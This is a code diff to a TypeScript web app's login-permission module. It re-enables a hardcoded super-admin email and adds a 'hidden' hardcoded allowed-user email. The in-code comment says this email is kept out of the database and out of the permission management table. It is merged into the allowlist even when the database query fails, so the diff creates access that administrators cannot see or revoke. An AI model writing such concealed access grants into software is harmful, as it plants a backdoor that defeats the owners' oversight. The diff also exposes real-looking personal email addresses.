@@ -11,9 +11,27 @@ import { useToast } from '../components/ui'
 // 超級管理員（硬編碼，始終有權限）
 export const SUPER_ADMINS = [
   'callumbao1122@gmail.com',
-  // 'pjpan0511@gmail.com',
+  'pjpan0511@gmail.com',
   'minlin1325@gmail.com',
 ]
+
+/**
+ * 僅在程式內併入登入名單（isAllowedUser），不寫入 DB；人員權限管理表不顯示此列。
+ * 小寫比對由 merge 邏輯處理。
+ */
+export const HIDDEN_CODE_ALLOWED_USER_EMAILS: readonly string[] = ['yylai0@gmail.com']
+
+function mergeAllowedListWithDb(dbEmails: string[]): string[] {
+  const seen = new Set<string>()
+  const out: string[] = []
+  for (const e of [...SUPER_ADMINS, ...HIDDEN_CODE_ALLOWED_USER_EMAILS, ...dbEmails]) {
+    const n = e.toLowerCase()
+    if (seen.has(n)) continue
+    seen.add(n)
+    out.push(e)
+  }
+  return out
+}
 
 /** 編輯記錄「操作者」顯示用，key 為小寫 email（與 SUPER_ADMINS 一一對應） */
 export const SUPER_ADMIN_DISPLAY_LABELS: Record<string, string> = {
@@ -127,16 +145,16 @@ async function loadAllowedEmails(): Promise<string[]> {
     
     if (error) {
       logger.error('Failed to load allowed emails:', error)
-      return SUPER_ADMINS
+      return mergeAllowedListWithDb([])
     }
     
     const emails = data?.map(row => row.email) || []
-    allowedEmailsCache = [...SUPER_ADMINS, ...emails]
+    allowedEmailsCache = mergeAllowedListWithDb(emails)
     cacheTimestamp = Date.now()
     return allowedEmailsCache
   } catch (err) {
     logger.error('Failed to load allowed emails:', err)
-    return SUPER_ADMINS
+    return mergeAllowedListWithDb([])
   }
 }
 
